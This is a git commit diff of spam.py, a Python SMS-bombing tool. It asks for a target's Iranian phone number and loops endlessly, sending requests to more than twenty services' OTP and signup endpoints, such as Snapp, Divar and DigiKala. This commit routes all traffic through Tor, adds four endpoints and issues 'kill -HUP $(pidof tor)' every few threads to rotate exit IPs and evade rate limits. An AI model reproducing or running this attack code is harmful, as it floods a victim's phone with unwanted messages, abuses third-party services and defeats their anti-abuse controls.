228c11e050ee80dbb6f558954a7c39ad1c366af5
SlavPH <110917771+SlavPH@users.noreply.github.com>
2022-09-11 23:43:20 -0400

    added more APIs
    + 4 more APIs
    + runs on tor
    + tor will reset every 5 threads

--- spam.py
+++ spam.py
@@ -8,9 +8,6 @@ import requests
 from threading import Thread
 
 
-
-
-
 # Config
 config = open("config.py", "r").read()
 exec(config)
@@ -20,7 +17,7 @@ exec(config)
 
 
 # Clear
-os.system("clear")
+os.system("cls" if os.name == "nt" else "clear")
 
 
 
@@ -35,7 +32,7 @@ def snapp(phone):
         }
 
     try:
-        SnapRequest = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=SnappHeader, json=SnappData, proxies=random.choices(proxy_list)[0])
+        SnapRequest = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=SnappHeader, json=SnappData, proxies=tor)
         if "OK" in SnapRequest.text:
             print(f"{green}True:  {white}Snapp{reset}")
         else:
@@ -52,7 +49,7 @@ def gap(phone):
     global GapHeader
 
     try:
-        GapRequest = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=GapHeader, proxies=random.choices(proxy_list)[0])
+        GapRequest = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=GapHeader, proxies=tor)
         if "OK" in GapRequest.text:
             print(f"{green}True:  {white}Gap{reset}")
         else:
@@ -73,7 +70,7 @@ def tap30(phone):
         }
 
     try:
-        Tap30Request = requests.post("https://tap33.me/api/v2/user", headers=Tap30Header, json=Tap30Data, proxies=random.choices(proxy_list)[0])
+        Tap30Request = requests.post("https://tap33.me/api/v2/user", headers=Tap30Header, json=Tap30Data, proxies=tor)
         if "OK" in Tap30Request.text:
             print(f"{green}True:  {white}Tap30{reset}")
         else:
@@ -94,7 +91,7 @@ def divar(phone):
         }
 
     try:
-        DivarRequest = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=DivarHeader, json=DivarData, proxies=random.choices(proxy_list)[0])
+        DivarRequest = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=DivarHeader, json=DivarData, proxies=tor)
         if "SENT" in DivarRequest.text:
             print(f"{green}True:  {white}Divar{reset}")
         else:
@@ -113,7 +110,7 @@ def bama(phone):
     BamaData = "cellNumber=0"+phone.split("+98")[1]
 
     try:
-        BamaRequest = requests.post("https://bama.ir/signin-send-otp", headers=BamaHeader, data=BamaData, proxies=random.choices(proxy_list)[0])
+        BamaRequest = requests.post("https://bama.ir/signin-send-otp", headers=BamaHeader, data=BamaData, proxies=tor)
         if "0" in BamaRequest.text:
             print(f"{green}True:  {white}Bama{reset}")
         else:
@@ -134,7 +131,7 @@ def dedifood(phone):
         "country_id": 1
         }
     try:
-        DedifoodRequest = requests.post(DedifoodURL ,json=DedifoodData, proxies=random.choices(proxy_list)[0])
+        DedifoodRequest = requests.post(DedifoodURL ,json=DedifoodData, proxies=tor)
         if "200" in str(DedifoodRequest):
             print(f"{green}True:  {white}Dedifood{reset}")
         else:
@@ -155,7 +152,7 @@ def behtarino(phone):
         "phone": "0" + phone.split("+98")[1]
         }
     try:
-        BehtarinoRequest = requests.post(BehtarinoURL, headers=BehtarinoHeader, json=BehtarinoData, proxies=random.choices(proxy_list)[0])
+        BehtarinoRequest = requests.post(BehtarinoURL, headers=BehtarinoHeader, json=BehtarinoData, proxies=tor)
         if "200" in str(BehtarinoRequest):
             print(f"{green}True:  {white}Behtarino{reset}")
         else:
@@ -175,7 +172,7 @@ def delino(phone):
         "mobile": "0" + phone.split("+98")[1]
         }
     try:
-        DelinoRequest = requests.post(DelinoURL, json=DelinoData, proxies=random.choices(proxy_list)[0])
+        DelinoRequest = requests.post(DelinoURL, json=DelinoData, proxies=tor)
         if "200" in str(DelinoRequest):
             print(f"{green}True:  {white}Delino{reset}")
         else:
@@ -196,7 +193,7 @@ def zarinplus(phone):
         "phone_number": phone.split("+")[1]
         }
     try:
-        ZarinplusRequest = requests.post(ZarinplusURL, headers=ZarinplusHeader, json=ZarinplusData, proxies=random.choices(proxy_list)[0])
+        ZarinplusRequest = requests.post(ZarinplusURL, headers=ZarinplusHeader, json=ZarinplusData, proxies=tor)
         if "200" in str(ZarinplusRequest):
             print(f"{green}True:  {white}Zarinplus{reset}")
         else:
@@ -220,7 +217,7 @@ def livito(phone):
         "grant_type": "password"
         }
     try:
-        LivitoRequest = requests.post(LivitoURL, headers=LivitoHeader, json=LivitoData, proxies=random.choices(proxy_list)[0])
+        LivitoRequest = requests.post(LivitoURL, headers=LivitoHeader, json=LivitoData, proxies=tor)
         if "200" in str(LivitoRequest):
             print(f"{green}True:  {white}Livito{reset}")
         else:
@@ -243,7 +240,7 @@ def baarbaanet(phone):
         "viaEmail": False
         }
     try:
-        BaarbaanetRequest = requests.post(BaarbaanetURL, headers=BaarbaanetHeader, json=BaarbaanetData, proxies=random.choices(proxy_list)[0])
+        BaarbaanetRequest = requests.post(BaarbaanetURL, headers=BaarbaanetHeader, json=BaarbaanetData, proxies=tor)
         if "200" in str(BaarbaanetRequest):
             print(f"{green}True:  {white}Baarbaanet{reset}")
         else:
@@ -266,7 +263,7 @@ def bornosmode(phone):
 
         }
     try:
-        BornosRequest = requests.post(BornosURL, headers=BornosHeader, json=BornosData, proxies=random.choices(proxy_list)[0])
+        BornosRequest = requests.post(BornosURL, headers=BornosHeader, json=BornosData, proxies=tor)
         if "200" in str(BornosRequest):
             print(f"{green}True:  {white}Bornos{reset}")
         else:
@@ -287,7 +284,7 @@ def komodaa(phone):
         "phone_number": "0" + phone.split("+98")[1]
         }
     try:
-        KomodaaRequest = requests.post(KomodaaURL, headers=KomodaHeader, json=KomodaaData, proxies=random.choices(proxy_list)[0])
+        KomodaaRequest = requests.post(KomodaaURL, headers=KomodaHeader, json=KomodaaData, proxies=tor)
         if "200" in str(KomodaaRequest):
             print(f"{green}True:  {white}Komodaa{reset}")
         else:
@@ -310,7 +307,7 @@ def digikala(phone):
         "otp_call": False
     }
     try:
-        DigiKalaRequest = requests.post(DigiKalaURl, headers=DigiKalaHeader, json=DigiKalaData, proxies=random.choices(proxy_list)[0])
+        DigiKalaRequest = requests.post(DigiKalaURl, headers=DigiKalaHeader, json=DigiKalaData, proxies=tor)
         if "200" in str(DigiKalaRequest):
             print(f"{green}True:  {white}DigiKala{reset}")
         else:
@@ -331,7 +328,7 @@ def alibaba(phone):
         "phoneNumber": phone.split("+98")[1]
     }
     try:
-        AlibabaRequest = requests.post(AlibabaURL, headers=AlibabaHeader, json=AlibabaData, proxies=random.choices(proxy_list)[0])
+        AlibabaRequest = requests.post(AlibabaURL, headers=AlibabaHeader, json=AlibabaData, proxies=tor)
         if "200" in str(AlibabaRequest):
             print(f"{green}True:  {white}Alibaba{reset}")
         else:
@@ -352,7 +349,7 @@ def sheypoor(phone):
         "username": "0" + phone.split("+98")[1]
     }
     try:
-        SheypoorRequest = requests.post(SheypoorURL, headers=SheypoorHeader, json=SheypoorData, proxies=random.choices(proxy_list)[0])
+        SheypoorRequest = requests.post(SheypoorURL, headers=SheypoorHeader, json=SheypoorData, proxies=tor)
         if "200" in str(SheypoorRequest):
             print(f"{green}True:  {white}Sheypoor{reset}")
         else:
@@ -363,8 +360,6 @@ def sheypoor(phone):
 
 
 
-
-#====================# New APIs #===================#
 
 # Esam
 def esam(phone):
@@ -378,7 +373,7 @@ def esam(phone):
         "serialNumber": "React1234"
     }
     try:
-        EsamRequest = requests.post(EsamURL, headers=EsamHeader, json=EsamData, proxies=random.choices(proxy_list)[0])
+        EsamRequest = requests.post(EsamURL, headers=EsamHeader, json=EsamData, proxies=tor)
         if "200" in str(EsamRequest):
             print(f"{green}True:  {white}Esam{reset}")
         else:
@@ -399,7 +394,7 @@ def namava(phone):
         "UserName": phone
     }
     try:
-        NamavaRequest = requests.post(NamavaURL, headers=NamavaHeader, json=NamavaData, proxies=random.choices(proxy_list)[0])
+        NamavaRequest = requests.post(NamavaURL, headers=NamavaHeader, json=NamavaData, proxies=tor)
         if "200" in str(NamavaRequest):
             print(f"{green}True:  {white}Namava{reset}")
         else:
@@ -420,7 +415,7 @@ def mymci(phone):
         "msisdn": phone.split("+98")[1]
     }
     try:
-        MyMCIRequest = requests.post(MyMCIURL, headers=MyMCIHeader, json=MyMCIData, proxies=random.choices(proxy_list)[0])
+        MyMCIRequest = requests.post(MyMCIURL, headers=MyMCIHeader, json=MyMCIData, proxies=tor)
         if "200" in str(MyMCIRequest):
             print(f"{green}True:  {white}MyMCI{reset}")
         else:
@@ -442,7 +437,7 @@ def tgju(phone):
     }
     # Do not works with Header
     try:
-        tgjuRequest = requests.post(tgjuURL, json=tgjuData, proxies=random.choices(proxy_list)[0])
+        tgjuRequest = requests.post(tgjuURL, json=tgjuData, proxies=tor)
         if "200" in str(tgjuRequest):
             print(f"{green}True:  {white}TGUI{reset}")
         else:
@@ -461,7 +456,7 @@ def torob(phone):
     new_phone = "0" + phone.split("+98")[1]
     TorobURL = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={new_phone}"
     try:
-        TorobRequest = requests.get(TorobURL, headers=TorobHeader, proxies=random.choices(proxy_list)[0])
+        TorobRequest = requests.get(TorobURL, headers=TorobHeader, proxies=tor)
         if "200" in str(TorobRequest):
             print(f"{green}True:  {white}Torob{reset}")
         else:
@@ -484,7 +479,7 @@ def telwebion(phone):
         "smsStatus": "default"
     }
     try:
-        TelWebionRequest = requests.post(TelWebionURL, headers=TelWebionHeader, json=TelWebionData, proxies=random.choices(proxy_list)[0])
+        TelWebionRequest = requests.post(TelWebionURL, headers=TelWebionHeader, json=TelWebionData, proxies=tor)
         if "200" in str(TelWebionRequest):
             print(f"{green}True:  {white}TelWebion{reset}")
         else:
@@ -494,6 +489,95 @@ def telwebion(phone):
 
 
 
+#====================# New APIs #===================#
+
+
+# Ponisha
+def ponisha(phone):
+    global PonishaHeader
+
+    PonishaURL = "https://ponisha.ir/send-mobile-verfication" 
+    PonishaData = {
+        "mobile": phone,
+        "type": "1"
+    }
+    try:
+        PonishaRequest = requests.post(PonishaURL, headers=PonishaHeader, json=PonishaData, proxies=tor)
+        if "200" in str(PonishaRequest):
+            print(f"{green}True:  {white}Ponisha{reset}")
+        else:
+            print(f"{red}False: {white}Ponisha{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
+
+# Salamcinama
+def salamcinama(phone):
+    global SalamcinamaHeader
+
+    SalamcinamaURL = "https://api.salamcinama.ir/share/v3/registration/mobile.json" 
+    SalamcinamaData = {
+        "mobile_number": "0" + phone.split("+98")[1],
+        "name": "randomfake names",
+        "signup_from": "vote"
+    }
+    try:
+        SalamcinamaRequest = requests.post(SalamcinamaURL, headers=SalamcinamaHeader, json=SalamcinamaData, proxies=tor)
+        if "200" in str(SalamcinamaRequest):
+            print(f"{green}True:  {white}Salamcinama{reset}")
+        else:
+            print(f"{red}False: {white}Salamcinama{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
+
+# Karnaval
+def karnaval(phone):
+    global KarnavalHeader
+
+    KarnavalURL = "https://api.karnaval.ir/graphql" 
+    KarnavalData = {
+        "queryId":"0edebe0df353cee7f11614a37087371f",
+        "variables":{
+            "phone": "0" + phone.split("+98")[1],
+            "isSecondAttempt": False
+        }
+    }
+    try:
+        KarnavalRequest = requests.post(KarnavalURL, headers=KarnavalHeader, json=KarnavalData, proxies=tor)
+        if "200" in str(KarnavalRequest):
+            print(f"{green}True:  {white}Karnaval{reset}")
+        else:
+            print(f"{red}False: {white}Karnaval{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
+
+# Kanape
+def kanape(phone):
+    global KanapeHeader
+    
+    KanapeURL = "https://api.kanape.ir/v4/auth/register"
+    KanapeData = {
+        "mobile": "0" + phone.split("+98")[1]
+    }
+    try:
+        KanapeRequest = requests.post(KanapeURL, headers=KanapeHeader, json=KanapeData, proxies=tor)
+        if "200" in str(KanapeRequest):
+            print(f"{green}True:  {white}Kanape{reset}")
+        else:
+            print(f"{red}False: {white}Kanape{reset}")
+    except:
+        print(f"{yellow}Can't send request")
 
 
 # Main
@@ -501,7 +585,8 @@ def main():
     global logo
 
     print(logo)
-    text = f"{blue}Enter target (+98xxxxxxxxxx) : {reset}" 
+
+    text = f"{blue}Enter target {white}(+98xxxxxxxxxx){blue} : {reset}" 
     for char in text:
         sys.stdout.write(char)
         sys.stdout.flush()
@@ -510,56 +595,107 @@ def main():
     phone = input()
 
     if len(phone) == 13:    
-        print (f"{blue}Spam Started!{reset}\n{blue}Hit {white}ctrl+c{blue} or {white}ctrl+z {blue}to exit!\n")
+        hint = (f"{blue}Spam Started!{reset}\n{blue}Hit {white}ctrl + z{blue} to {white}exit{reset}!\n")
+        for char in hint:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            time.sleep(0.0)
 
         while True:
+
+            IP = requests.get("http://httpbin.org/ip", proxies=tor).json()['origin']
+            print(f"\n{blue}Connected to {white}{IP}{blue} With tor!{reset}\n")
+
+
+            Thread(target=ponisha, args=[phone]).start()       # Ponisha
+            time.sleep(0.5)
+
+            Thread(target=salamcinama, args=[phone]).start()   # Salamcinama
+            time.sleep(0.5)
+        
+            Thread(target=karnaval, args=[phone]).start()      # Karnaval
+            time.sleep(0.5)
+
+            Thread(target=kanape, args=[phone]).start()        # Kanape
+            time.sleep(0.5)
+
             Thread(target=snapp, args=[phone]).start()         # Snapp
             time.sleep(0.5)
+
+            os.system("kill -HUP $(pidof tor)")
+
             Thread(target=gap, args=[phone]).start()           # Gap
             time.sleep(0.5)
+
             Thread(target=tap30, args=[phone]).start()         # Tap30
             time.sleep(0.5)
+
             Thread(target=divar, args=[phone]).start()         # Divar
             time.sleep(0.5)
+
             Thread(target=bama, args=[phone]).start()          # Bama
             time.sleep(0.5)
+
             Thread(target=dedifood, args=[phone]).start()      # Dedifood
-            time.sleep(0.5) 
+            time.sleep(0.5)
+
+            os.system("kill -HUP $(pidof tor)")
+
             Thread(target=behtarino, args=[phone]).start()     # Behtarino
             time.sleep(0.5)
+
             Thread(target=delino, args=[phone]).start()        # Delino
             time.sleep(0.5)
+
             Thread(target=zarinplus, args=[phone]).start()     # Zarinplus
             time.sleep(0.5)
+
             Thread(target=livito, args=[phone]).start()        # Livito
             time.sleep(0.5)
+
             Thread(target=baarbaanet, args=[phone]).start()    # Baarbaanet
             time.sleep(0.5)
+
+            os.system("kill -HUP $(pidof tor)")
+
             Thread(target=bornosmode, args=[phone]).start()    # Bornos
             time.sleep(0.5)
+
             Thread(target=komodaa, args=[phone]).start()       # Komodaa
-            time.sleep(0.5) 
+            time.sleep(0.5)
+ 
             Thread(target=digikala, args=[phone]).start()      # DigiKala
             time.sleep(0.5)
+
             Thread(target=alibaba, args=[phone]).start()       # Alibaba
             time.sleep(0.5)
-            Thread(target=sheypoor, args=[phone]).start()      # Sheypoor
-            time.sleep(0.5) 
 
-            #=====# New APIs #=====#
+            Thread(target=sheypoor, args=[phone]).start()      # Sheypoor
+            time.sleep(0.5)
+
+            os.system("kill -HUP $(pidof tor)")
 
             Thread(target=esam, args=[phone]).start()          # Esam
             time.sleep(0.5)
+
             Thread(target=namava, args=[phone]).start()        # Namava
             time.sleep(0.5)
+
             Thread(target=mymci, args=[phone]).start()         # MyMCI
-            time.sleep(0.5) 
+            time.sleep(0.5)
+ 
             Thread(target=tgju, args=[phone]).start()          # tgju
             time.sleep(0.5)
+
             Thread(target=torob, args=[phone]).start()         # Torob
-            time.sleep(0.5)        
+            time.sleep(0.5)
+        
             Thread(target=telwebion, args=[phone]).start()     # TelWebion
-            time.sleep(0.5) 
+            time.sleep(0.5)
+ 
+            os.system("kill -HUP $(pidof tor)")
+
+
 
     else:
         error = f"{white}Error: {red}Invalid number entered!"
@@ -571,8 +707,15 @@ def main():
 
 
 
-
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        back = f"\n{blue}Exiting by user request {white}...{reset}"
+        for char in back:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            time.sleep(0.05)
+        sys.exit()
 
 # SlavPH
